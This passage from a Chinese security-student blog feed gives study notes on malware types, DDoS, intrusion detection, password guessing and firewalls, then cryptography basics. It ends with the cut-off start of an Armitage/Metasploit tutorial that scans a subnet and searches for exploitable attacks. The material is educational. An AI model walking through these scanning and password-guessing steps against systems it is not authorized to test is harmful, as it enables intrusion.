title="病毒分类"></a>病毒分类</h4><p>按照<strong>感染目标</strong>分类，包括以下类型：</p><ul><li>引导扇区感染病毒：感染主引导记录或者其他引导记录，当系统从包含这种病毒的磁盘启动时，病毒将传播开来。</li><li>文件感染病毒：感染被操作系统或Shell认为是可执行的文件</li><li>宏病毒：在一个应用程序解释宏代码或脚本代码时感染文件</li><li>混合体病毒：用多种方式感染文件。能够感染多种类型的文件，清除该病毒要处理所有可能感染的地方</li></ul><p>按<strong>隐藏策略</strong>进行分类的病毒包括以下几种：</p><ul><li>加密病毒：生成密钥加密病毒。当一个受感染的程序调用时，解密该病毒。当病毒被复制时，另选一个不同的随机密钥加密病毒。</li><li>隐蔽性病毒：具有较好的隐蔽性，逃避反病毒软件的检测</li><li>多态病毒：每次感染表现为不同的形态，使通过病毒特征的检测方法无效。</li><li>变形病毒：每次感染过程中也会表现为不同形态。但变形病毒会改写自身的代码，从而增加检测的难度，既可以改变它们的行为，也可以改变其外观。</li></ul><h3 id="分布式拒绝服务攻击DDos"><a href="#分布式拒绝服务攻击DDos" class="headerlink" title="分布式拒绝服务攻击DDos"></a>分布式拒绝服务攻击DDos</h3><p>分布式SYN突发流量攻击：</p><p><img src="/images/ddossyn.png"></p><p>分布式ICMP攻击：</p><p><img src="/images/ddosicmp.png"></p><h4 id="基于DDoS攻击的洪泛攻击分类"><a href="#基于DDoS攻击的洪泛攻击分类" class="headerlink" title="基于DDoS攻击的洪泛攻击分类"></a>基于DDoS攻击的洪泛攻击分类</h4><p><img src="/images/directddos.png"></p><p><img src="/images/reflectorddos.png"></p><h4 id="DDos防护"><a href="#DDos防护" class="headerlink" title="DDos防护"></a>DDos防护</h4><p>攻击前：攻击预防</p><p>攻击中：攻击检测和过滤</p><p>攻击后：攻击源追踪</p><h3 id="思考题-2"><a href="#思考题-2" class="headerlink" title="思考题"></a>思考题</h3><p>1.恶意软件用于传播的三种主要机制是什么？</p><p>恶意软件可用于传播的三种广泛机制是:病毒感染现有可执行文件或解释内容，随后病毒传播到其他系统。利用软件漏洞，通过蠕虫或驱动下载在本地或网络上进行攻击，以允许恶意软件复制。以及社会工程攻击，即说服用户绕过安全机制安装特洛伊木马，或响应网络钓鱼攻击。</p><p>2.恶意软件携带的四种主要类型的载荷是什么？</p><p>恶意软件可能携带的四大类有效负载是:系统或数据文件的损坏;为了使系统成为僵尸代理而窃取服务作为僵尸网的一部分；窃取系统中的信息，尤其是通过键盘记录或问谍软件程序窃取登录、密码或其他个人详细信息；以及恶意软件隐藏了它在系统上的存在，以防止系统试图检测和阻止它。</p><h2 id="入侵者"><a href="#入侵者" class="headerlink" title="入侵者"></a>入侵者</h2><ul><li>对计算机系统或网络的入侵已成为计算机安全最严重的威胁之一。</li><li>入侵检测系统可以提供早期的预警，从而避免或减轻入侵所造成的损失。</li><li>入侵检测涉及对正常行为的模式检测和对与入侵相关的异常行为的模式检测。</li><li>防备入侵一个重要的组成部分就是口令管理，其目标是阻止非授权用户获得其他用户的口令。</li></ul><h3 id="入侵者-1"><a href="#入侵者-1" class="headerlink" title="入侵者"></a>入侵者</h3><h4 id="入侵者行为模式"><a href="#入侵者行为模式" class="headerlink" title="入侵者行为模式"></a>入侵者行为模式</h4><ul><li>用户非法入侵(黑客)与软件非法入侵(病毒)</li><li>三类入侵者 (hackers or crackers):<ul><li>伪装者Masquerader</li><li>违法行为者Misfeasor</li><li>秘密用户Clandestine user</li></ul></li><li>系统入侵已经明显地发展成为一个社会问题</li><li>许多入侵看起来是无害的，但仍消耗大量资源</li><li>可以通过被控制的系统向其他机器发起攻击</li></ul><h4 id="入侵技术"><a href="#入侵技术" class="headerlink" title="入侵技术"></a>入侵技术</h4><p>系统通常维护一个与每个授权用户相关的口令文件。如果系统对该口令文件没有保护，敌手很容易获得口令。<br><strong>口令文件及其保护</strong></p><ul><li>One-way encryption(单向加密), 用口令产生一个密钥用于加密</li><li>Access Control(访问控制)，限制对口令文件的访问</li></ul><p><strong>猜测口令的技术</strong></p><ul><li>尝试默认口令</li><li>穷尽所有短口令(1到3个字符)</li><li>尝试在线词典中的单词或看似口令的单词表(60,000)</li><li>收集用户信息，如爱好、生日、配偶或孩子名</li><li>尝试用户电话、社会安全号，住址</li><li>使用特洛伊木马</li><li>窃听远程用户和主机之间的线路</li></ul><h3 id="入侵检测"><a href="#入侵检测" class="headerlink" title="入侵检测"></a>入侵检测</h3><ul><li>有效的入侵检测系统可以看成阻止入侵的屏障</li><li>入侵检测可以收集入侵技术的信息，用以增强入侵阻止工具</li><li>入侵检测建立的前提是假设入侵者的行为在某些情况下不同于合法用户的行为，然而两者仍有重叠部分。放宽定义入侵者行为，会发现更多的入侵者，也会产生大量的“错误肯定”</li><li>为减少错误肯定，严格定义入侵者的行为，将导致错误否定的增加，即无法判断出入侵者。因此在入侵的实践中存在巧妙的折衷</li></ul><p><img src="/images/attacker.png"></p><h4 id="入侵检测方法"><a href="#入侵检测方法" class="headerlink" title="入侵检测方法"></a>入侵检测方法</h4><p>统计异常检测Statistical anomaly detection，定义通常的或期望的行为</p><ul><li>阈值检测Treshold detection</li><li>基于形态的检测Profile based</li></ul><p>基于规则的检测Rule based detection，定义合适的行为</p><ul><li>异常检测Anomaly detection</li><li>渗透识别Penetration identidication</li></ul><p>审计记录，入侵检测的基本工具</p><ul><li>原有审计记录</li><li>专门用于检测的审计记录</li></ul><h4 id="基于规则的入侵检测"><a href="#基于规则的入侵检测" class="headerlink" title="基于规则的入侵检测"></a>基于规则的入侵检测</h4><p>通过观察系统中的事件，应用决定给定活动模式是否可疑的规则集来检测入侵行为</p><ul><li>异常检测，类似于统计的异常检测</li><li>基于规则的渗透标识：采用基于专家系统技术的方法, 使用规则来识别已知的渗透, 或那些利用已知弱点的渗透行为。</li></ul><p>NDIX采用启发式规则对行为分配可疑程度</p><p>IDES使用渗透标识模式，当生成审计记录时进行检查，并与规则库相匹配；如果找到匹配，用户的可疑等级会提高；匹配了足够多的规则，等级超过阈值，导致异常报告</p><h4 id="分布式入侵检测"><a href="#分布式入侵检测" class="headerlink" title="分布式入侵检测"></a>分布式入侵检测</h4><p>分布式入侵检测系统要考虑的几个问题</p><ul><li>分布式入侵检测系统可能需要处理不同的审计记录格式</li><li>网络上一个或多个结点将作为数据收集和分析点，需要保证数据完整性和机密性</li><li>集中的或分散的体系结构都可以使用</li></ul><p>分布式入侵检测系统的组成</p><ul><li>主机代理模块：收集主机上有关事件数据，送给中央管理者</li><li>局域网监视代理模块：与主机代理模块类似</li><li>中央管理者模块：接收事件报告，关联事件，检测入侵</li></ul><p><img src="/images/ruqinjiance.png"></p><h4 id="蜜罐技术"><a href="#蜜罐技术" class="headerlink" title="蜜罐技术"></a>蜜罐技术</h4><p>蜜罐是诱导潜在的攻击者远离重要系统的圈套</p><ul><li>转移攻击重要系统的攻击者</li><li>收集攻击者活动的信息</li><li>希望攻击者在系统中逗留足够的时间，使管理员能对此攻击做出响应</li></ul><p>蜜罐充满合法用户不会访问、但表面看起来有价值的虚假信息，任何对蜜罐的访问都是可疑的<br>蜜罐系统使用的工具包括灵敏的监视器和事件日志<br>初始使用一台有IP地址的机器吸引黑客，现在是建立蜜罐网络，用来模拟一个企业网络。使用实际的或模拟的通信量和数据，一旦黑客进入，管理员可以详细观察到他们的行为，提出防范措施。</p><h3 id="口令管理"><a href="#口令管理" class="headerlink" title="口令管理"></a>口令管理</h3><p><strong>用户ID的作用</strong></p><ul><li>确定用户是否获得访问系统的授权</li><li>确定分配给用户的相应权利</li><li>用于自主的访问控制</li></ul><p><strong>UNIX口令模式</strong><br>用户选择长度大于8个可打印字符的口令, 转换成56位的值, 作为加密例程的密钥输入。加密例程cryp(3)是基于DES的，使用12位的盐值salt修改DES算法。使用由0组成的64位数据输入执行DES算法，输出作为二次加密的输入，加密过程重复25次。<br>产生的64位输出被转换成11个字符序列，密文口令和明文盐值副本一起存放在口令文件相应用户ID项中。</p><p><img src="/images/unixpassword.png"></p><h4 id="口令选择策略"><a href="#口令选择策略" class="headerlink" title="口令选择策略"></a>口令选择策略</h4><p><strong>用户教育</strong><br><strong>计算机生成的口令</strong><br>如果口令本质上完全随机，难以被用户接受<br><strong>后验的口令检查</strong><br>系统定期运行口令破解程序来找到可猜测的口令并通知用户修正<br><strong>预先的口令检查</strong></p><ul><li>允许用户选择口令，系统检查口令是否是允许的，使用户在相当大的空间中选择可记忆的且在词典攻击中不太可能猜出的口令。</li><li>简单的规则约束系统，如口令至少8个字符，且应混用</li><li>编译一个可能的口令大词典，不允许用户选择</li><li>基于Bloom过滤器的口令检查技术：一种高效的先验口令检查技术，基于拒绝列表上的单词，已经在许多系统上使用了，包括Linux系统。</li></ul><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>信息系统不断发展完善，每个人都希望与互联网相连或连接到网上，存在安全忧虑，不能很容易地使组织中的各系统得到安全保护，典型地使用防火墙，用以提供边界防御，作为复杂的安全策略的一部分</p><h4 id="什么是防火墙？"><a href="#什么是防火墙？" class="headerlink" title="什么是防火墙？"></a>什么是防火墙？</h4><ul><li>是网络控制和监视的关键点</li><li>用不同的信任与网络相连接</li><li>对网络服务进行强制性限制</li><li>对访问进行审查和控制</li><li>提供NAT和使用监视</li><li>用 IPSec 实现VPN </li><li>对于渗透是免疫的</li></ul><h4 id="防火墙设计目标"><a href="#防火墙设计目标" class="headerlink" title="防火墙设计目标"></a>防火墙设计目标</h4><ul><li><p>所有通信都必须经过防火墙</p></li><li><p>只有被授权的通信才能通过防火墙</p></li><li><p>防火墙本身不能被攻破</p></li></ul><h3 id="防火墙的四种机制"><a href="#防火墙的四种机制" class="headerlink" title="防火墙的四种机制"></a>防火墙的四种机制</h3><h4 id="服务控制"><a href="#服务控制" class="headerlink" title="服务控制"></a>服务控制</h4><p>确定可以访问的互联网服务类型，在IP地址、协议，或端口号的基础上对数据流进行过滤，或提供委托代理，自身作为服务器。</p><h4 id="方向控制"><a href="#方向控制" class="headerlink" title="方向控制"></a>方向控制</h4><p>确定特定服务请求发起和通过的方向，即允许通过防火墙的进入或者离开。</p><h4 id="用户控制"><a href="#用户控制" class="headerlink" title="用户控制"></a>用户控制</h4><p>根据试图访问服务器的用户来控制服务器的访问权限。</p><h4 id="行为控制"><a href="#行为控制" class="headerlink" title="行为控制"></a>行为控制</h4><p>控制特定服务的使用方法。如防火墙可以过滤电子邮件来清除垃圾邮件，或者控制外部用户只能对本地Web服务器上的部分信息访问。</p><h3 id="防火墙的局限性"><a href="#防火墙的局限性" class="headerlink" title="防火墙的局限性"></a>防火墙的局限性</h3><ul><li>防火墙防外不防内</li><li>不能防范绕过防火墙的攻击</li><li>安全性不当的局域网可能受到外部访问</li><li>不能防范病毒</li><li>配置复杂，容易出现漏洞</li><li>往往只认机器不认人，控制粒度较粗</li></ul><h3 id="防火墙类型"><a href="#防火墙类型" class="headerlink" title="防火墙类型"></a>防火墙类型</h3><ul><li>包过滤防火墙：对每个传入传出IP数据包的一组应用规则，然后转发或者丢弃该数据包</li><li>状态检测防火墙：状态检测包过滤器通过建造了一个出站TCP连接目录加强了TCP流量的规则。</li><li>应用层网关：也称代理服务器，充当应用程序级流量的中继</li><li>链路层网关</li></ul><p><img src="/images/firewall.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>保研夏令营复习计划-密码学</title>
    <link href="/blog/2020/05/11/%E4%BF%9D%E7%A0%94%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92-%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    <url>/blog/2020/05/11/%E4%BF%9D%E7%A0%94%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92-%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
    
    <content type="html"><![CDATA[<p><strong>密码学是网络空间安全的主要的一门专业课之一，主要包括对称加密算法、非对称加密算法以及密码学算法的安全性以及应用。</strong></p><p><img src="/images/fj49.jpg"></p><span id="more"></span><h2 id="对称加密和消息机密性"><a href="#对称加密和消息机密性" class="headerlink" title="对称加密和消息机密性"></a>对称加密和消息机密性</h2><h3 id="对称加密原理"><a href="#对称加密原理" class="headerlink" title="对称加密原理"></a>对称加密原理</h3><p>一个对称加密方案由五部分组成：</p><ul><li>明文</li><li>加密算法</li><li>秘密密钥</li><li>密文</li><li>解密算法</li></ul><h4 id="密码体制"><a href="#密码体制" class="headerlink" title="密码体制"></a>密码体制</h4><p>密码体制一般从三个不同的方面进行分类：</p><ul><li>明文转换成密文的操作类型</li><li>使用的密钥数：发送者接受者使用同一密钥，该体制就是对称加密算法，反之为非对称加密算法。</li><li>明文处理方式：分组密码一次处理一个输入元素分组，输出与输入对应的分组。流密码连续的处理输入元素，每次产生一个输出元素。</li></ul><h4 id="密码分析"><a href="#密码分析" class="headerlink" title="密码分析"></a>密码分析</h4><p><img src="/images/cryptoana.png"></p><p>计算安全：</p><ul><li>破解密文的代价超出被加密信息的价值</li><li>破解密文需要的时间超出信息的有用寿命</li></ul><h4 id="Feistel密码结构"><a href="#Feistel密码结构" class="headerlink" title="Feistel密码结构"></a>Feistel密码结构</h4><p><img src="/images/feistel.png"></p><p>分组密码的操作取决于下列参数：</p><ul><li>分组大小：分组越大安全性越高效率越低，128bit合理且折中</li><li>密钥大小：越长的密钥越安全，但是也会降低效率，普遍使用密钥长度128bit</li><li>迭代轮数：典型迭代轮数16轮</li><li>子密钥产生算法：复杂度越高，密码破译难度越高</li><li>轮函数：同样，复杂度越高越难以破解</li></ul><h3 id="对称分组加密算法"><a href="#对称分组加密算法" class="headerlink" title="对称分组加密算法"></a>对称分组加密算法</h3><h4 id="数据加密标准DES"><a href="#数据加密标准DES" class="headerlink" title="数据加密标准DES"></a>数据加密标准DES</h4><p><strong>算法描述：</strong></p><p>明文长度为64it，密钥长度为56bit，更长的明文被分为64bit的分组来处理。采用16轮迭代，从原始的56bit密钥产生16组子密钥，每一轮迭代使用一个子密钥。</p><p>DES解密过程在本质上和加密过程相同。规则如下：使用密文作为DES算法的输入，但是子密钥Ki的使用顺序与加密时相反。即第一次使用K16，第二次使用K15，以此类推知道最后一次使用K1.</p><p>穷举密钥消耗的时间：</p><p><img src="/images/desqj.png"></p><h4 id="三重DES"><a href="#三重DES" class="headerlink" title="三重DES"></a>三重DES</h4><p>3DES使用三个密钥执行三次DES算法，其组合过程依照加密-解密-加密的顺序：</p><p>C &#x3D; E（K3，D（K2，E（K1，P）））</p><p>P &#x3D;  D（K1，E（K2，D（K3，C）））</p><p><img src="/images/3des.png"></p><h4 id="高级加密标准AES"><a href="#高级加密标准AES" class="headerlink" title="高级加密标准AES"></a>高级加密标准AES</h4><p>AES使用的分组大小为128bit，密钥长度可以为128、192、256bit。常用128bit密钥长度</p><p>算法描述：</p><p>AES没有使用Feistel结构，而是在每轮替换和移位时都并行处理整个数据分组。</p><p>输入密钥被扩展成为44个32比特字的数组w[i]。4个不同的字（128bit）用作每轮的轮密钥。</p><p>进行了4个不同的步骤，一个是移位，3个是替换：</p><ul><li>字节替换：使用S盒来对分组进行逐一的字节替换</li><li>行移位：对行做简单的移位</li><li>列混合：对列的每个字节做替换，是一个与本列全部字节有关的函数</li><li>轮密钥加：将当前分组与一部分扩展密钥简单的按位异或</li></ul><p><img src="/images/aes.png"></p><p>加密和解密的最后一轮都只包含3个步骤，这么做是为了使密码可逆</p><p><img src="/images/aesround.png"></p><h3 id="随机数和伪随机数"><a href="#随机数和伪随机数" class="headerlink" title="随机数和伪随机数"></a>随机数和伪随机数</h3><p>满足随机性和不可预测性</p><h4 id="真随机数发生器、伪随机数生成器和为随机函数"><a href="#真随机数发生器、伪随机数生成器和为随机函数" class="headerlink" title="真随机数发生器、伪随机数生成器和为随机函数"></a>真随机数发生器、伪随机数生成器和为随机函数</h4><p>密码应用程序通常利用了随机数生成的算法技术。这些算法具有确定性的特点，因此产生的数列不具有统计上的随机性。虽然如此，如果这个算法很好，那么产生出的数列将会通过很多合理的随机性测试，这种数字被称为<strong>伪随机数字</strong></p><p>真随机数发生器将一个有效的随机源作为输入源，这个源被称为熵源。</p><p><img src="/images/randomgen.png"></p><p>伪随机函数(PRF): PRF被用来产生一些固定长度的伪随机比特串。例如对称的加密密钥和随机数。典型的PRF采用种子加上上下文中特定的值作为输入，例如用户名ID和应用程序ID。</p><h3 id="流密码和RC4"><a href="#流密码和RC4" class="headerlink" title="流密码和RC4"></a>流密码和RC4</h3><h4 id="流密码结构"><a href="#流密码结构" class="headerlink" title="流密码结构"></a>流密码结构</h4><p><img src="/images/streamcrypto.png"></p><p>如果伪随机数生成器设计合理，对同样的密钥长度，流密码和分组密码一样安全。流密码的主要优点是流密码与分组密码相比几乎总是更快，使用更少的代码。本节中的示例RC4能用仅仅几行代码实现。最近几年，随着AES的引进，这个优势已经消失了，因为AES可以用软件方式高效实现。比如，Intel AES指令集含有一轮加解密和密钥产生过程使用的机器指令。使用硬件指令实现AES跟仅使用软件方式相比，速度提高了-一个数量级。</p><h4 id="RC4算法"><a href="#RC4算法" class="headerlink" title="RC4算法"></a>RC4算法</h4><p>由于RC4算法加密是采用的xor，所以，一旦子密钥序列出现了重复，密文就有可能被破解。那么，RC4算法生成的子密钥序列是否会出现重复呢？由于存在部分弱密钥，使得子密钥序列在不到100万字节内就发生了完全的重复，如果是部分重复，则可能在不到10万字节内就能发生重复，因此，推荐在使用RC4算法时，必须对加密密钥进行测试，判断其是否为弱密钥。其不足主要体现于，在无线网络中IV（初始化向量）不变性漏洞。</p><p><img src="/images/rc4.png"></p><h3 id="分组密码工作模式"><a href="#分组密码工作模式" class="headerlink" title="分组密码工作模式"></a>分组密码工作模式</h3><h4 id="电子密码本模式ECB"><a href="#电子密码本模式ECB" class="headerlink" title="电子密码本模式ECB"></a>电子密码本模式ECB</h4><p>最简单的一种使用方式是所谓的电子密码本(ECB) 模式，在此模式下明文一-次被处理b比特，而且明文的每-一个分组都使用同-密钥加密。之所以使用术语密码本，是因为对于给定的密钥，每个b比特的明文分组对应唯一的密文。 因此，可以想象一个庞大的密码本，它包含任何可能的b比特明文对应的密文。</p><p>如果同一个64比特的明文分组在消息中出现了不止一次，它总是产生相同的密文。因此，对于过长的消息，ECB模式可能不安全。</p><h4 id="密码分组链接模式CBC"><a href="#密码分组链接模式CBC" class="headerlink" title="密码分组链接模式CBC"></a>密码分组链接模式CBC</h4><p>加密算法输入是当前明文分组与前一密文分组的异或；每个分组使用同一密钥。这就相当于将所有的明文组连接起来了。加密函数每次输入和明文分组之间的关系不固定。</p><p>解密时，用解密算法依次处理每个密文分组。将其结果与前一密文分组进行异或，产生明文分组：</p><p><img src="/images/aescbc.png"></p><p>为了产生第一个密文分组，将一个初始向量IV和第一个明文分组进行异或。解密时将IV和解密算法的输出进行异或来恢复第一个明文分组。</p><p>发送者和接收着都必须知道IV。为了提高安全性，IV需要像密钥一样进行保护。这可以通过使用ECB加密传送IV来完成。要保护IV的一个理由如下：如果攻击者成功欺骗接收者使其使用一个不同的IV值，接着攻击者就能把明文的第一个分组的某些位取反。</p><h4 id="密码反馈模式CFB"><a href="#密码反馈模式CFB" class="headerlink" title="密码反馈模式CFB"></a>密码反馈模式CFB</h4><p>这种模式可以将任意分组密码转换成流密码。流密码不需要将消息填充为分组的整数倍，它还能实时操作，因此，如果传送字符流，使用面向字符的流密码，每个字符都能被及时的加密并传送。</p><p>加密：加密模块的输入是一个64bit的移位寄存器，初始值设定为某一初始向量IV。加密模块输出的最左边s比特和明文P1的第一单元进行异或，产生密文C1的第一个单元，然后传输，接下来移位寄存器的内容都左移s比特，同时将C1方在移位寄存器的最右边s比特。这个过程一致持续知道所有明文单元都已被加密。</p><p>解密时使用同样的方案，不同的时将接收到的密文单元和加密模块的输出进行异或得到明文单元。注意这里使用的是加密函数，而不是解密函数。</p><p><img src="/images/aescfb.png"></p><h4 id="计数器模式CTR"><a href="#计数器模式CTR" class="headerlink" title="计数器模式CTR"></a>计数器模式CTR</h4><p><img src="/images/aesctr.png"></p><p>计数器初始化为某一值，然后随着消息块的增加计数器值增加1 (以2的b次方为模，b为分组长度)。在加密时，计数器被加密然后与明文分组异或来产生密文分组，这里没有链接。当解密时，相同序列的计数器值与密文异或来恢复相对应的明文分组。</p><h2 id="公钥密码和消息认证"><a href="#公钥密码和消息认证" class="headerlink" title="公钥密码和消息认证"></a>公钥密码和消息认证</h2><h3 id="消息认证的方法"><a href="#消息认证的方法" class="headerlink" title="消息认证的方法"></a>消息认证的方法</h3><h4 id="利用常规加密的消息认证"><a href="#利用常规加密的消息认证" class="headerlink" title="利用常规加密的消息认证"></a>利用常规加密的消息认证</h4><p>假设只有发送者和接受者共享一个密钥，那么假定接收者能够识别有效的消息时，只有真正的发送者才能够成功的为对方加密消息。此外，如果消息里带有错误检测码和序列号，则接收者能够确认消息是否被篡改过和序列号是否正常。</p><p>事实上，对数据认证而言只使用对称加密的方法不是一个合适的工具。比如使用ECB加密的分组加密算法，攻击者重排密文分组次序仍然可以解密。</p><h4 id="非加密的消息认证"><a href="#非加密的消息认证" class="headerlink" title="非加密的消息认证"></a>非加密的消息认证</h4><p>这里分析几种不依赖于加密消息认证方法。所有的这些方法都会生成认证标签，并且附在每一条消息上用于传输。消息本身并不会被加密，所以它在目的地可读而与目的地认证功能无关。</p><p><strong>消息认证码</strong></p><p>一种认证技术利用私钥产生一小块数据，称之为<strong>消息认证码</strong>，将其附到消息上。假设只有消息发送者和接收者知道密钥，若收到的认证码与计算的一致，即可证明：</p><ul><li>消息没有被篡改</li><li>接收者确保消息来自合法的发送者</li><li>如果消息中包含序列号，而攻击者不能成功修改序列号，那么接收者就可以确认消息的正确序列</li></ul><p><img src="/images/mac.png"></p><p><strong>单向散列函数</strong></p><p>MAC的一种替代方法是使用单向散列函数。如同MAC，散列函数接收变长消息M作为输入，生成定长的消息摘要H(M)作为输出。与MAC不同的是散列不需要密钥，为了消息认证，消息摘要要随消息一起以可信的形式传送。</p><h3 id="安全散列函数"><a href="#安全散列函数" class="headerlink" title="安全散列函数"></a>安全散列函数</h3><h4 id="散列函数的要求"><a href="#散列函数的要求" class="headerlink" title="散列函数的要求"></a>散列函数的要求</h4><p>散列函数的目的是为文件、消息或其他数据块产生指纹，H函数必须具有以下性质：</p><ul><li>H可适用于任意长度的数据块</li><li>H能生成固定长度的输出</li><li>对于任意x，计算H(x)相对容易，并且可以用软硬件方式实现</li><li>需要具有单向性，或具有抵抗原像攻击性</li><li>对于人一给定数据块x，找到满足H(y)&#x3D;H(x)的y!&#x3D;x在计算上是不可行的，即具有抗弱碰撞攻击性</li><li>找到满足H(y)&#x3D;H(x)的任意一对xy在计算上是不可行的。满足这一特性的散列函数称为抗碰撞性，有时也被称为抗强碰撞性</li></ul><h4 id="散列函数的安全性"><a href="#散列函数的安全性" class="headerlink" title="散列函数的安全性"></a>散列函数的安全性</h4><p>有两种方法可以攻击一个安全的散列函数：密码分析法和蛮力攻击法</p><p>散列函数抵抗蛮力攻击的强度完全依赖于算法生成的散列码的长度。攻击一个长度为n的散列码所需要付出的代价如下：</p><table><thead><tr><th align="center">攻击</th><th align="center">复杂度</th></tr></thead><tbody><tr><td align="center">抗原像</td><td align="center">2^n</td></tr><tr><td align="center">抗第二原像</td><td align="center">2^n</td></tr><tr><td align="center">抗碰撞</td><td align="center">2^(n&#x2F;2)</td></tr></tbody></table><h4 id="简单散列函数"><a href="#简单散列函数" class="headerlink" title="简单散列函数"></a>简单散列函数</h4><p>所有散列函数都按照下面基本原理操作。把输入看成n比特块的序列。对输入用迭代的方式每次处理一块，生成n比特的散列函数。</p><h4 id="SHA安全散列函数"><a href="#SHA安全散列函数" class="headerlink" title="SHA安全散列函数"></a>SHA安全散列函数</h4><p>sha512流程：</p><p><img src="/images/sha512.png"></p><h3 id="消息认证码"><a href="#消息认证码" class="headerlink" title="消息认证码"></a>消息认证码</h3><h4 id="HMAC"><a href="#HMAC" class="headerlink" title="HMAC"></a>HMAC</h4><p>目标：</p><ul><li>不必修改而直接使用现有的散列函数。特别是很容易免费得到软件上执行速度较快的散列函数及其代码。</li><li>嵌入式散列函数要有很好的可移植性，以便开发更快或更安全的散列函数。</li><li>保持散列函数的原有性能，不发生显著退化。</li><li>使用和处理密钥简单。</li><li>如果已知嵌入的散列函数的强度，则完全可以知道认证机制抗密码分析的强度。</li></ul><h3 id="公钥密码原理"><a href="#公钥密码原理" class="headerlink" title="公钥密码原理"></a>公钥密码原理</h3><h4 id="公钥密码思想"><a href="#公钥密码思想" class="headerlink" title="公钥密码思想"></a>公钥密码思想</h4><p>基本步骤如下：</p><ol><li>每个用户都生成一对密钥用来对消息进行加密和解密。</li><li>每个用户把两个密钥中的一个放在公共寄存器或其他可访问的文件夹里，这个密钥便是公钥，另一个密钥自己保存。</li><li>如果Bob希望给Alice发私人消息，则他用Alice的公钥加密消息。</li><li>当Alice收到这条消息，用私钥解密。因为只有Alice知道她自己的私钥，其他人收到消息无法进行解密</li></ol><h4 id="公钥密码系统的应用"><a href="#公钥密码系统的应用" class="headerlink" title="公钥密码系统的应用"></a>公钥密码系统的应用</h4><ul><li>加密解密</li><li>数字签名：私钥签名，公钥验证</li><li>密钥交换</li></ul><p><img src="/images/publiccrypt.png"></p><h3 id="公钥密码算法"><a href="#公钥密码算法" class="headerlink" title="公钥密码算法"></a>公钥密码算法</h3><h4 id="RSA公钥密码算法"><a href="#RSA公钥密码算法" class="headerlink" title="RSA公钥密码算法"></a>RSA公钥密码算法</h4><p>对一明文块M和密文块C，加密和解密有如下形式：</p><p>C &#x3D; M^e mod n</p><p>M &#x3D; C ^ d mod n &#x3D; M^ed mod n</p><p>设A为明文，B为密文，则：<br> A&#x3D;B^d mod n；<br> B&#x3D;A^e mod n；<br>e和n是公钥，d是私钥。</p><p>n&#x3D;p*q, d&#x3D;e^-1 mod (p-1)(q-1)发送方和接收方都必须知道n和e的值，并且只有接收者知道d的值。RSA公钥密码算法的公钥KU &#x3D; {e,n}，私钥KR &#x3D; {d,n}。为使该算法能够用于公钥加密，它必须满足下列要求：</p><ul><li>可以找到e、d、n的值，是的对所有的M&lt;n,M^ed mod n &#x3D; M成立</li><li>对所有满足M&lt;n的值，计算M^e  C^d 相对容易</li><li>给定e和n，不可能推出d</li></ul><p><img src="/images/rsasf.png"></p><h4 id="Diffie-Hellman密钥交换"><a href="#Diffie-Hellman密钥交换" class="headerlink" title="Diffie-Hellman密钥交换"></a>Diffie-Hellman密钥交换</h4><p>Diffie-Hellman算法的目的就是使两个用户能够安全的交换密钥，供以后加密消息时使用。该算法本身局限于密钥交换。</p><p><strong>算法：</strong></p><p><img src="/images/dhjiaohuan.png"></p><p><strong>可能遭受中间人攻击：</strong></p><p><img src="/images/dhattack.png"></p><h4 id="其他公钥密码算法"><a href="#其他公钥密码算法" class="headerlink" title="其他公钥密码算法"></a>其他公钥密码算法</h4><ol><li>数字签名标准DSS：专为数字签名功能而设计的算法。与RSA不同，它不能用来加密或者密钥交换</li><li>椭圆曲线密码ECC：ECC相比于RSA主要吸引力在于它只需要少数比特就可以提供相同强度的安全性，从而减轻了处理开销</li></ol><h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p>假设Bob想给Alice发送消息。虽然这条消息的保密性并不重要，但是他想Alice能够确定这条消息确实是来自于他。当Alice收到密文时，她发现能够用Bob的公钥进行解密，从而证明这条消息确实是Bob加密的。因为没有其他人拥有Bob的私钥，所以其他任何人都不能创建由Bob的公钥能够解密的密文。因此，整个加密的消息就成为一个数字签名(digital signature)。此外，由于没有Bob的私钥就不可能篡改消息，所以数字签名不仅认证了消息源，它还保证了数据的完整性。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>图形化界面渗透软件：Armitage</title>
    <link href="/blog/2020/05/08/%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2%E6%B8%97%E9%80%8F%E8%BD%AF%E4%BB%B6%EF%BC%9AArmitage/"/>
    <url>/blog/2020/05/08/%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2%E6%B8%97%E9%80%8F%E8%BD%AF%E4%BB%B6%EF%BC%9AArmitage/</url>
    
    <content type="html"><![CDATA[<p><strong>今天学习一款图形化渗透软件Armitage的使用，它拥有友好的可视化图形操作界面、强大的集成环境与自动化的渗透流程，是一款Java写的Metasploit图形界面化的渗透软件。</strong></p><p><img src="/images/fj48.jpg"></p><span id="more"></span><h2 id="打开Armitage"><a href="#打开Armitage" class="headerlink" title="打开Armitage"></a>打开Armitage</h2><p>点击图标即可打开，但是kali2020始终打不开，不知道为什么。直接换命令行sudo armitage即可，直接连接默认配置就好：</p><p><img src="/images/armitage.png"></p><p>用Armitage之前先要开启Metasploit相关服务。如果没开的话，在这里直接点击“是”他就会帮你开启</p><p><img src="/images/armitage1.png"></p><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p>刚开始还是一片空白，我们需要去扫描内网下的主机。依次选择Hosts-&gt;Nmap Scan-&gt;QuickScan(OS detect)，然后填写内网网段</p><p><img src="/images/armitage2.png"></p><p><img src="/images/armitage3.png"></p><h2 id="Find-Attacks"><a href="#Find-Attacks" class="headerlink" title="Find Attacks"></a>Find Attacks</h2><p>可以点击主机，services，查看nmap的扫描结果：</p><p><img src="/images/armitage4.png"></p><p>如何对靶机进行攻击？依次选择Attacks-&gt;Find Attacks，就可以自动搜索这些设备可能存在漏洞及风险</p><p>如果没有，点击Armitage菜单-Set exploit 